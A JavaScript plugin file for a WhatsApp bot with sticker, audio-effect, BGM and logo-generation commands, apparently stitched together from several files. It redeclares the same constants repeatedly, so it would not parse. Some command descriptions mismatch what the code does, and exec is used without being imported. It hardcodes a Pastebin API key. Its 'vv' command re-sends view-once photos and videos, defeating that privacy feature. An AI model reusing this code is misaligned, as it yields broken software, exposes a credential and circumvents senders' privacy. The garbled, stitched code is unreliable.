const os = require('os');
let menus = false;
const moment = require("moment-timezone");
const fs = require("fs-extra");
const Config = require('../config');
let { fancytext, tlang, runtime, formatp, botpic, getBuffer, prefix, sck1 } = require("../lib");
const long = String.fromCharCode(8206);
const readmore = long.repeat(4001);
const sᴜʜᴀɪʟ_ᴍᴅ= require('../lib/commands');
const mediafire = require("../lib/mediafire.js");
const GDriveDl = require('../lib/scraper.js')
const fbInfoVideo = require('fb-info-video'); 
const googleTTS = require("google-tts-api");
const ytdl = require('ytdl-secktor')
const cheerio = require('cheerio')
const axios= require('axios');
const videotime = 3600; // 30 min
const dlsize = 100; // 100mb
const { tlang, ringtone, cmd, fetchJson, sleep, botpic, getBuffer, pinterest, prefix, Config } = require('../lib')
const { dare, truth, random_question, Config } = require('../lib/truth-dare.js')
const { TelegraPh } = require('../lib/scraper')
const { eco } = require('discord-mongoose-economy')
const ty = eco.connect(mongodb);
const { Insta } = require('../lib');
const { redeploy, getvar, delvar, getallvar, change_env, get_deployments } = require('../lib/koyeb')
const { addnote, delnote, allnotes, delallnote, tlang, fetchJson, botpic, runtime, prefix, Config, alive } = require('../lib')
const { stickers } = require('../config')
const { Anime, Manga } = require("@shineiichijo/marika");
const {  fetchJson, getBuffer} = require('../lib/')
const { ffmpeg, cmd } = require('../lib')
const { TelegraPh , bgms  } = require('../lib/')
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const Jimp = require("../lib/jimp");
const { plugins, plugindb, remove } = require('../lib')
const PastebinAPI = require("pastebin-js");
pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");

//
const {cmd,tlang} = require('../lib')
cmd({   pattern: "restart", desc: "To restart bot",category: "tools", filename: __filename }, async(Void, citel,text,{ isCreator }) => {  if (!isCreator) return citel.reply(tlang().owner);  const { exec } = require("child_process"); citel.reply('Restarting'); exec('pm2 restart all'); });

 //

 const DB = require('../lib/scraper')
const simpleGit = require('simple-git');
const Heroku = require('heroku-client');
const git = simpleGit();

//Simple WhatsApp Commands
//Copy and Give Credits
// Works of Astro
// Works of @Astropedaa
// Contact if you need help astromedia0010@outlook.com
// WhatsApp 2340839607375
// Telegram -------- 















































// Paste Text CMD
cmd({
    pattern: "addpst",
    desc: "create paste of text.",
    category: "general",
    filename: __filename,
},
async(Void,citel,text)=>
{
if(!citel.quoted) return await citel.reply("Uhh Please, Reply to Audio/Video To Add In Bgm")
if(!text) return await citel.reply ("Uhh Please give Bgm Song NAme")

let isVideo = false ;
let path ='' ; 
if (citel.quoted.mtype == 'videoMessage') 
{
path = await Void.downloadAndSaveMediaMessage(citel.quoted)
isVideo = true ;
}
else if (citel.quoted.mtype == 'audioMessage') 
{
isVideo = false ;
let audioPath = await Void.downloadAndSaveMediaMessage(citel.quoted,'audio');
let res = await convertAudioToBlackScreenVideo(audioPath, './convertedVideo.mp4');
if(res.result) {path = "./convertedVideo.mp4"}
}
else return await citel.reply("Uhh Please, Reply to Audio/Video To Add In Bgm")
if (!path) return await citel.reply("There's an Error While Adding Bgm Song")
let url = await TelegraPh(path)
let bgmm= await bgms.findOne({ id:"3" }) || await new bgms({ id:"3"}).save();
try {
bgmm.bgmArray.set(text, url);
await bgmm.save();
return await citel.reply(`*New Song Added in BGM with Name : ${text}*`);
} catch (error) { return await citel.reply('Error updating BGM:'+ error); }
})
//DEL PASTE TEXT CMD
cmd({
    pattern: "delpst",
    desc: "create paste of text.",
    category: "general",
    filename: __filename,
},
async(Void,citel,text)=>{
if(!text) return await citel.reply("Give Me Song Name to Delete From BGM")
let bgmm= await bgms.findOne({ id:"3" }) || await new bgms({ id:"3"}).save();
if (bgmm.bgmArray.has(text)) {
bgmm.bgmArray.delete(text);
await bgmm.save();
return await citel.reply('Song _'+ text +'_ removed from BGM.');
} else { return await citel.reply(`Name _'${text}'_ does not exist in BGM.`);}
})
//ALL PASTE TEXT CMD
cmd({
    pattern: "allpst",
    desc: "create paste of text.",
    category: "general",
    filename: __filename,
},
async(Void,citel,text)=>{
text = ' *BGM SONG INFORMATION*\n'
const {TelegraPh , bgm } = require('../lib/')
let bgmm= await bgms.findOne({ id:"3" }) || await new bgms({ id:"3"}).save();
for (const [name, url] of bgmm.bgmArray) 
{
 text+=`${name} : _${url}_ \n`
}
return await citel.reply(text);
})
//ON TEXT PASTE CMD
cmd({ on: "text" }, async (Void,citel,text)=> {
if(Config.botbgm === 'true' &&  citel.text.length > 1)
{
let citelText = ` ${citel.text} ` ; 
let bgmm= await bgms.findOne({ id:"3" }) || await new bgms({ id:"3"}).save();
for (const [name, url] of bgmm.bgmArray) 
{
let newName = `${name} `; 
if (citelText.toLowerCase().includes(newName)) {  return await Void.sendMessage(citel.chat,{audio: { url : url },mimetype: 'audio/mpeg',ptt: true,waveform: [99,75,25,00,00,00,00,00,00,00,00,00,05,25,50,75,99,75,50,25,00]})     }  //LOL DO NOT EDIT THIS
      }}
})
//THE END OF THAT LOL


















//CONVERTERS CMD
cmd({
    pattern: "photo",
    desc: "Makes photo of replied sticker.",
    category: "converter",
    use: '<reply to any gif>',
    filename: __filename
},
async(Void, citel, text) => {
    const getRandom = (ext) => {
        return `${Math.floor(Math.random() * 10000)}${ext}`
    }
    if (!citel.quoted) return citel.reply(`_Reply to Any Sticker._`)
    let mime = citel.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
let name = await getRandom('.png')
exec(`ffmpeg -i ${media} ${name}`, (err) => {
let buffer = fs.readFileSync(media)
Void.sendMessage(citel.chat, { image: buffer }, { quoted: citel })
      fs.unlink(media, (err) => {
     if (err) { return console.error('File Not Deleted from From TOPHOTO AT : ' , media,'\n while Error : ' , err);  }
     else return console.log('File deleted successfully in TOPHOTO  at : ' , media);
     });
     
    })
    
} else return citel.reply ("Please, Reply To A Non Animated Sticker")
}
)
//view once cmd
cmd({
    pattern: "vv",
    alias : ['viewonce','retrive'],
    desc: "Flips given text.",
    category: "misc",
    use: '<query>',
    filename: __filename
},
async(Void, citel, text) => {
try {
const quot = citel.msg.contextInfo.quotedMessage.viewOnceMessageV2;
if(quot)
{
if(quot.message.imageMessage) 
{ console.log("Quot Entered") 
let cap =quot.message.imageMessage.caption;
let anu = await Void.downloadAndSaveMediaMessage(quot.message.imageMessage)
return Void.sendMessage(citel.chat,{image:{url : anu},caption : cap })
}
if(quot.message.videoMessage) 
{
let cap =quot.message.videoMessage.caption;
let anu = await Void.downloadAndSaveMediaMessage(quot.message.videoMessage)
return Void.sendMessage(citel.chat,{video:{url : anu},caption : cap })
}

}
  
}  

catch(e) {  console.log("error" , e ) }     

  
if(!citel.quoted) return citel.reply("Please Reply A ViewOnce Message")           
if(citel.quoted.mtype === "viewOnceMessage")
{ console.log("ViewOnce Entered") 
if(citel.quoted.message.imageMessage )
{ 
let cap =citel.quoted.message.imageMessage.caption;
let anu = await Void.downloadAndSaveMediaMessage(citel.quoted.message.imageMessage)
Void.sendMessage(citel.chat,{image:{url : anu},caption : cap })
}
else if(citel.quoted.message.videoMessage )
{
let cap =citel.quoted.message.videoMessage.caption;
let anu = await Void.downloadAndSaveMediaMessage(citel.quoted.message.videoMessage)
Void.sendMessage(citel.chat,{video:{url : anu},caption : cap })
}

}
else return citel.reply("This is Not A ViewOnce Message")
})
//attp lolz
cmd({
    pattern: "attp",
    alias: ["circlestic","circlesticker","cs"],
    desc: "Makes sticker of replied image/video.",
    category: "sticker",
filename: __filename,
    use: '<reply to any image/video.>'
},
async(Void, citel, text) => {
if(!text) return citel.reply("```Uhh Please, Give Me text```")
let url = `https://raganork-api.onrender.com/api/attp?text=${text}&apikey=with_love_souravkl11`
let media  = await getBuffer(url)

        let sticker = new Sticker(media, {
            pack: Config.packname, 
            author: Config.author, 
            type: StickerTypes.FULL,
            categories: ["🤩", "🎉"], 
            id: "12345", 
            quality: 100,
            background: "transparent", 
        });
        const buffer = await sticker.toBuffer();
        return Void.sendMessage(citel.chat, {sticker: buffer}, {quoted: citel });

}
)
//Sticker Maker
cmd({
    pattern: "sticker",
    alias: ["s"],
    desc: "Makes sticker of replied image/video.",
    category: "sticker",
filename: __filename,
    use: '<reply to any image/video.>'
},
async(Void, citel, text) => {
let mime = citel.mtype;
let media ;
let pack = Config.packname
let author = Config.author 
if (mime =="imageMessage" || mime =="videoMessage") {  media = await citel.download(); }
else if (citel.quoted){ 
mime = citel.quoted.mtype; 
if (mime =="imageMessage" || mime =="videoMessage" || mime =="stickerMessage") {  media = await citel.quoted.download(); }
else return citel.reply("```Uhh,Please reply to any image or video```")
}
else return citel.reply("```Uhh,Please reply to any image or video```");
  
if(mime =="videoMessage")
{
let caption = { packname :Config.packname, author:Config.author}
const { writeExifVid }  = require("../lib/exif.js")
let buffer = await writeExifVid(media , caption  );   
return await Void.sendMessage(   citel.chat ,  { sticker: { url: buffer }, } );
}
 let sticker = new Sticker(media, {
            pack: pack, // The pack name
            author: author, // The author name
            type: StickerTypes.FULL ,
            categories: ["🤩", "🎉"], // The sticker category
            id: "12345", // The sticker id
            quality: 100, // The quality of the output file
            background: "transparent",
        });
        const buffer = await sticker.toBuffer();
        return Void.sendMessage(citel.chat, {sticker: buffer}, {quoted: citel });
})
// Circle Sticker
cmd({
    pattern: "circle",
    alias: ["circlestic","circlesticker","cs"],
    desc: "Makes sticker of replied image/video.",
    category: "sticker",
filename: __filename,
    use: '<reply to any image/video.>'
},
async(Void, citel, text) => {
    if (!citel.quoted) return citel.reply(`*Reply To any Image or video Sir.*`);
  //console.log("Quoted Data here : ",citel.quoted);
    let mime = citel.quoted.mtype
    pack = Config.packname
    author = Config.author
   if (mime =="imageMessage" || mime =="stickerMessage") {
        let media = await citel.quoted.download();
        //citel.reply("*Processing Your request*");
        let sticker = new Sticker(media, {
            pack: pack, // The pack name
            author: author, // The author name
            type: StickerTypes.CIRCLE ,
            categories: ["🤩", "🎉"], // The sticker category
            id: "12345", // The sticker id
            quality: 75, // The quality of the output file
        });
        const buffer = await sticker.toBuffer();
        return Void.sendMessage(citel.chat, {sticker: buffer}, {quoted: citel });
    }else return citel.reply("*Uhh,Please reply to any image*");

}
)
// Crop Sticker
cmd({
    pattern: "crop",
    alias: ["cropstic","csticker","cropsticker"],
    desc: "Makes sticker of replied image/video.",
    category: "sticker",
filename: __filename,
    use: '<reply to any image/video.>'
},
async(Void, citel, text) => {
    if (!citel.quoted) return citel.reply(`*Reply To any Image or video Sir.*`);
  //console.log("Quoted Data here : ",citel.quoted);
    let mime = citel.quoted.mtype
    pack = Config.packname
    author = Config.author
    if (mime =="imageMessage"  || mime =="stickerMessage") {
        let media = await citel.quoted.download();
        //citel.reply("*Processing Your request*");
        let sticker = new Sticker(media, {
            pack: pack, // The pack name
            author: author, // The author name
            type: StickerTypes.CROPPED,
            categories: ["🤩", "🎉"], // The sticker category
            id: "12345", // The sticker id
            quality: 75, // The quality of the output file
        });
        const buffer = await sticker.toBuffer();
        return Void.sendMessage(citel.chat, {sticker: buffer}, {quoted: citel });
    }else return citel.reply("*Uhh,Please reply to any image*");

}
)
// Round Sticker
cmd({
    pattern: "round",
    alias: ["roundstic","roundsticker"],
    desc: "Makes sticker of replied image/video.",
    category: "sticker",
filename: __filename,
    use: '<reply to any image/video.>'
},
async(Void, citel, text) => {
    if (!citel.quoted) return citel.reply(`*Reply To any Image or video Sir.*`);
  //console.log("Quoted Data here : ",citel.quoted);
    let mime = citel.quoted.mtype
    pack = Config.packname
    author = Config.author
   if (mime =="imageMessage" || mime =="stickerMessage") {
        let media = await citel.quoted.download();
        //citel.reply("*Processing Your request*");
        let sticker = new Sticker(media, {
            pack: pack, // The pack name
            author: author, // The author name
            type: StickerTypes.ROUNDED ,
            categories: ["🤩", "🎉"], // The sticker category
            id: "12345", // The sticker id
            quality: 75, // The quality of the output file
        });
        const buffer = await sticker.toBuffer();
        return Void.sendMessage(citel.chat, {sticker: buffer}, {quoted: citel });
    }else return citel.reply("*Uhh,Please reply to any image*");

}
)
// Meme Sticker
cmd({
    pattern: "memegen",
    desc: "Write text on quoted image.",
    category: "sticker",
    filename: __filename,
    use: '<text>',
},
async(Void, citel, text) => {
    if(!text && !citel.quoted) return await citel.reply("*Reply to Photo With text To Create Meme.*")
    if (citel.quoted.mtype != 'imageMessage') return citel.reply(`*Uhh Please, Reply to Photo Only.*`)

  let textt = text.split('|')[0] || '' ;
  let isCheck = text.split('|')[1] || 'sticker'; 
  let tex1 =  textt.split(';')[0] || 'Suhail' ;    
  let tex2 =  textt.split(';')[1] || '_' ;

    let mee = await Void.downloadAndSaveMediaMessage(citel.quoted)
    let bg = await TelegraPh(mee)
    let thmb =await getBuffer(`https://api.memegen.link/images/custom/${tex2}/${tex1}.png?background=${bg}`)

  if (isCheck.startsWith('p') || isCheck.startsWith('P')) { await Void.sendMessage(citel.chat , {image : thmb , caption : Config.caption })  }
  else
  {
    let sticker = new Sticker(thmb, {
            pack: Config.packname, 
            author: Config.author, 
            type: StickerTypes.FULL,
            categories: ["🤩", "🎉"], 
            id: "12345", 
            quality: 100,
            background: "transparent", 
        });
        const buffer = await sticker.toBuffer();
        return Void.sendMessage(citel.chat, {sticker: buffer}, {quoted: citel }); 
  }
  
    return await fs.unlinkSync(mee)

}
)
// Quotely Sticker
cmd({
    pattern: "quotely",
    desc: "Makes Sticker of quoted text.",
    alias: ["q"],
    category: "sticker",
    use: '<reply to any message.>',
    filename: __filename
},
async(Void, citel, text) => {
    if (!citel.quoted) return citel.reply(`Please quote/reply to any message`);
    let textt = citel.quoted.text;
    let pfp;
    try {
        pfp = await Void.profilePictureUrl(citel.quoted.sender, "image");
    } catch (e) {
        pfp = THUMB_IMAGE;
    }
    let todlinkf = ["#FFFFFF", "#000000"];
    let todf = todlinkf[Math.floor(Math.random() * todlinkf.length)];
    let username = await sck1.findOne({ id: citel.quoted.sender })
    var tname;
    if (username.name && username.name !== undefined) {
        tname = username.name
    } else {
        tname = Void.getName(citel.quoted.sender)
    }
    let body = {
        type: "quote",
        format: "png",
        backgroundColor: todf,
        width: 512,
        height: 512,
        scale: 3,
        messages: [{
            avatar: true,
            from: {
                first_name: tname,
                language_code: "en",
                name: tname,
                photo: {
                    url: pfp,
                },
            },
            text: textt,
            replyMessage: {},
        }, ],
    };
    let res = await axios.post("https://bot.lyo.su/quote/generate", body);
    let img = Buffer.alloc(res.data.result.image.length, res.data.result.image, "base64");
    return citel.send(img,{packname:Config.packname,author:''},"sticker")

}
)
//---------------------------------------------------------------------------
cmd({
    pattern: "fancy",
    desc: "Makes stylish/fancy given text",
    category: "converter",
    use: '56 Asta',
    react: "✅",
    filename: __filename
},
async(Void, citel, text) => {
    if (isNaN(text.split(" ")[0]) || !text) {
        let text = tiny(
            "Fancy text generator\n\n*_______________________________*\n*Example: .fancy 20 Asta*\n*_______________________________*\n\n"
        );
        listall("Asta").forEach((txt, num) => {
            text += `${(num += 1)} ${txt}\n`;
        });
        return await citel.reply(text);
    }

    let fancytextt = await fancytext(`${text.slice(2)}`, text.split(" ")[0])
    citel.send(fancytextt)

}
)
// tiny url
cmd({
    pattern: "tiny",
    desc: "Makes url tiny.",
    category: "converter",
    use: '<url>',
    react: "✅",
    filename: __filename
},
async(Void, citel, text) => {
    if (!text) return citel.reply(`Provide me a link`)
    try {
        let link = text.split(" ")[0];
        let anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`);
        citel.send(`*🛡️Your Shortened URL*\n\n${anu.data}`);
    } catch (e) {
        console.log(e);
    }
}
)
// vid to audi
cmd({
pattern: "toaudio",
alias:['mp3','tomp3'],
desc: "changes type to audio.",
category: "converter",
use: '<reply to any Video>',
filename: __filename
},
async(Void, citel, text) => {
if (!citel.quoted) return citel.reply(`_Reply to Any Video_`);
let mime = citel.quoted.mtype
if (mime =="audioMessage" || mime =="videoMessage")
{
let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
 const { toAudio } = require('../lib');
 let buffer = fs.readFileSync(media);
let audio = await toAudio(buffer);
Void.sendMessage(citel.chat, { audio: audio, mimetype: 'audio/mpeg' }, { quoted: citel });


fs.unlink(media, (err) => {
if (err) { return console.error('File Not Deleted from From TOAUDIO AT : ' , media,'\n while Error : ' , err);  }
else return console.log('File deleted successfully in TOAUDIO MP3 at : ' , media);
});

}
else return citel.send ("*Uhh Please, Reply To A video Message*")
}
)
//---------------------------------------------------------------------------
cmd({
pattern: "toMp4",
alias:['mp4','tovideo','tovid'],
desc: "changes type to audio.",
category: "converter",
use: '<reply to any Video>',
filename: __filename
},
async(Void, citel, text) => {
const { webp2mp4File } = require ("../lib")
if (!citel.quoted) return citel.send('*Uhh Dear, Reply To Animated Sticker or Gif*')
let mime = citel.quoted.mtype
let mimetype = citel.quoted.mimetype
if( mime !="videoMessage" && !/webp/.test(mimetype)) return await citel.send("*Damn... Reply To An Animated Sticker or Gif *")
let media = await Void.downloadAndSaveMediaMessage(citel.quoted)
try {
if (/webp/.test(mimetype)) {  let webpToMp4 = await webp2mp4File(media);  media =  webpToMp4.result; }
await Void.sendMessage(citel.chat, { video: { url: media ,}, caption: Config.caption  },)
try{ return await fs.unlink(media);}catch(e){ return console.log("Error While Deleting Tomp4 File :  ", e)}
}catch(e){ return console.log("*Your Request Not Be Proceed due to Error.*  \n*_Error :_* ", e)}
}
)
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




















































/// AUDIO
cmd({
    pattern: "bass",
    desc: "adds bass in given sound",
    category: "audio",
    use: '<reply to any audio>',
},
async(Void, citel) => {
    let mime = citel.quoted.mtype
    let set = "-af equalizer=f=54:width_type=o:width=2:g=20";
    if (/audio/.test(mime)) {
        citel.send(tlang().wait);
        let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
        let ran = citel.sender.slice(6) + (".mp3");
        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media);
            if (err) return reply(err);
            let buff = fs.readFileSync(ran);
            Void.sendMessage(
                citel.chat, {
                    audio: buff,
                    mimetype: "audio/mpeg",
                }, {
                    quoted: citel,
                }
            );
            fs.unlinkSync(ran);
        });
    } else
        citel.send(
            `Reply to the audio you want to change with*`
        );
}
)
cmd({
    pattern: "blown",
    desc: "adds blown in given audio",
    category: "audio",
    use: '<reply to any audio>',
   // react:"✅",
},
async(Void, citel) => {
    let mime = citel.quoted.mtype
    let set = "-af acrusher=.1:1:64:0:log";
    if (/audio/.test(mime)) {
        citel.send(tlang().wait);
        let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
        let ran = citel.sender.slice(6) + (".mp3");
        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media);
            if (err) return reply(err);
            let buff = fs.readFileSync(ran);
            Void.sendMessage(
                citel.chat, {
                    audio: buff,
                    mimetype: "audio/mpeg",
                }, {
                    quoted: citel,
                }
            );
            fs.unlinkSync(ran);
        });
    } else
        citel.send(
            `Reply to the audio you want to change with.*`
        );
}
)
cmd({
    pattern: "deep",
    desc: "adds deep effect in given audio",
    category: "audio",
    use: '<reply to any audio>',
  //  react:"✅",
},
async(Void, citel) => {
    let mime = citel.quoted.mtype
    let set = "-af atempo=4/4,asetrate=44500*2/3";
    if (/audio/.test(mime)) {
        citel.send(tlang().wait);
        let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
        let ran = citel.sender.slice(6) + (".mp3");
        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media);
            if (err) return reply(err);
            let buff = fs.readFileSync(ran);
            Void.sendMessage(
                citel.chat, {
                    audio: buff,
                    mimetype: "audio/mpeg",
                }, {
                    quoted: citel,
                }
            );
            fs.unlinkSync(ran);
        });
    } else
        citel.send(
            `Reply to the audio you want to change with.*`
        );
}
)
cmd({
    pattern: "fast",
    desc: "Adds fast(equilizer) in quoted audio.",
    category: "audio",
    use: '<reply to any audio>',
},
async(Void, citel) => {
    let mime = citel.quoted.mtype
    let set = '-filter:a "atempo=1.63,asetrate=44100"';
    if (/audio/.test(mime)) {
        citel.send(tlang().wait);
        let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
        let ran = citel.sender.slice(6) + (".mp3");
        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media);
            if (err) return reply(err);
            let buff = fs.readFileSync(ran);
            Void.sendMessage(
                citel.chat, {
                    audio: buff,
                    mimetype: "audio/mpeg",
                }, {
                    quoted: citel,
                }
            );
            fs.unlinkSync(ran);
        });
    } else
        citel.send(
            `Reply to the audio you want to change with.*`
        );
}
)
cmd({
    pattern: "reverse",
    desc: "Adds reverse(equilizer) in quoted audio.",
    category: "audio",
    use: '<reply to any audio>',
  //  react:"✅",
},
async(Void, citel) => {
    let mime = citel.quoted.mtype
    let set = '-filter_complex "areverse"';
    if (/audio/.test(mime)) {
        citel.send(tlang().wait);
        let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
        let ran = citel.sender.slice(6) + (".mp3");
        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media);
            if (err) return reply(err);
            let buff = fs.readFileSync(ran);
            Void.sendMessage( citel.chat, {  audio: buff, mimetype: "audio/mpeg",}, { quoted: citel, });
            fs.unlinkSync(ran);
        });
    } else  citel.send(`Reply to the audio you want to change with.*`);
}
)









































//DEAP SEA
async function singleText(Void, citel, url = "", text1, text2) {
    const maker = require("mumaker");
    try {
      let anu;
      let urlss = "https://textpro.me/" + url + ".html";
      if (text1 && !text2) {
        anu = await maker.textpro(urlss, text1);
      } else if (text1 && text2) {
        anu = await maker.textpro(urlss, [text1, text2]);
      }
      return await Void.sendMessage(citel.chat, {
        image: {
          url: anu.image
        },
        caption: Config.caption
      }, {
        quoted: citel
      });
    } catch (_0x450f19) {
      console.log("error For TextPro : ", _0x450f19);
      return await citel.send("*_Error while Generating Your Photo_*");
    }
  }
//========================================================================================================

//-----------------------------------------------------------------------------------
cmd({ pattern: "slice", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('*_Example : .slice Asta_*');
        return await singleText(Void, citel , 'create-light-glow-sliced-text-effect-online-1068' , text )
    })
//-----------------------------------------------------------------------------------
cmd({ pattern: "glow", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('*_Example : .glow Asta_*');
        return await singleText(Void, citel , 'free-advanced-glow-text-effect-873' , text )
    })
//----------------------------------------------------------------------------------- 
cmd({ pattern: "gitch1", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('*_Example : .gitch1 Asta_*');
        return await singleText(Void, citel , 'create-impressive-glitch-text-effects-online-1027' , text )        
    }) 
//---------------------------------------------------------------------------
//================================================================================================================================
cmd({ pattern: "stel",alias:['steal'],category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('_Example : .steel suhail;tech info_');  
            let text1 = text ? text.split(';')[0] : '';
            let text2 = text ? text.split(';')[1] : '';
            if(!text2 || !text1) return await citel.reply("*Uhh Please Provide text. Example: .stel text1;text2*");
            return await singleText(Void, citel , '3d-steel-text-effect-877' , text1 , text2 )
        })
//-----------------------------------------------------------------------------------
cmd({ pattern: "avenger",category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('*_Example : .avenger suhail;tech_*');  
            let text1 = text ? text.split(';')[0] : '';
            let text2 = text ? text.split(';')[1] : '';
            if(!text2 || !text1) return await citel.reply("*Uhh Please Provide text. Example: .avenger text1;text2*");
            return await singleText(Void, citel ,'create-3d-avengers-logo-online-974' , text1 , text2 )
        })
//-----------------------------------------------------------------------------------
cmd({ pattern: "marvel",category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('*_Example : .marvel suhail;tech_*');  
            let text1 = text ? text.split(';')[0] : '';
            let text2 = text ? text.split(';')[1] : '';
            if(!text2 || !text1) return await citel.reply("*Uhh Please Provide text. Example: .marvel text1;text2*");
            return await singleText(Void, citel , 'create-logo-style-marvel-studios-ver-metal-972' , text1 , text2 )
        })
//-----------------------------------------------------------------------------------
cmd({ pattern: "phub",category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('*_Example : .phub suhail;tech_*');  
            let text1 = text ? text.split(';')[0] : '';
            let text2 = text ? text.split(';')[1] : '';
            if(!text2 || !text1) return await citel.reply("*Uhh Please Provide text. Example: .phub text1;text2*");
            return await singleText(Void, citel , 'pornhub-style-logo-online-generator-free-977' , text1 , text2 )
        })
//-----------------------------------------------------------------------------------

cmd({ pattern: "glitch",category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('*_Example : .glitch suhail;tech_*');  
            let text1 = text ? text.split(';')[0] : '';
            let text2 = text ? text.split(';')[1] : '';
            if(!text2 || !text1) return await citel.reply("*Uhh Please Provide text. Example: .glitch text1;text2*");
            return await singleText(Void, citel ,'create-glitch-text-effect-style-tik-tok-983', text1 , text2 )
        })
//-----------------------------------------------------------------------------------
cmd({ pattern: "glitch2",category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('*_Example : .glitch2 suhail;tech_*');  
            let text1 = text ? text.split(';')[0] : '';
            let text2 = text ? text.split(';')[1] : '';
            if(!text2 || !text1) return await citel.reply("*Uhh Please Provide text. Example: .glitch2 text1;text2*");
            return await singleText(Void, citel , 'create-a-glitch-text-effect-online-free-1026' , text1 , text2 )
        })
//-----------------------------------------------------------------------------------
cmd({ pattern: "grafiti",category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
            if (!text) return citel.reply('*_Example : .grafiti suhail;tech_*');  
            let text1 = text ? text.split(';')[0] : '';
            let text2 = text ? text.split(';')[1] : '';
            if(!text2 || !text1) return await citel.reply("*Uhh Please Provide text. Example: .grafiti text1;text2*");
            return await singleText(Void, citel ,'create-a-cool-graffiti-text-on-the-wall-1010'  , text1 , text2 )
        })
//================================================================================================================================
    //---------------------------------------------------------------------------
    cmd({ pattern: "deepsea", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'create-3d-deep-sea-metal-text-effect-online-1053' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "horror", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel ,'horror-blood-text-effect-online-883'  , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "whitebear", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel ,'online-black-and-white-bear-mascot-logo-creation-1012', text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "joker", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'create-logo-joker-online-934' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "metallic", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'create-a-metallic-text-effect-free-online-1041' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "steel", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'steel-text-effect-online-921' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "harrypotter", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'create-harry-potter-text-effect-online-1025' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "underwater", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , '3d-underwater-text-effect-generator-online-1013' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "luxury", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , '3d-luxury-gold-text-effect-online-1003' , text )

    })
    //---------------------------------------------------------------------------
cmd({ pattern: "glue", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'create-3d-glue-text-effect-with-realistic-style-986' , text )
    })
    //---------------------------------------------------------------------------
cmd({ pattern: "fabric", category: "logo", desc: "Some text to image feature with various styles.",filename: __filename, }, async(Void, citel, text) => {
        if (!text) return citel.reply('_Need text._')
        return await singleText(Void, citel , 'fabric-text-effect-online-964' , text )
    })
    //---------------------------------------------------------------------------
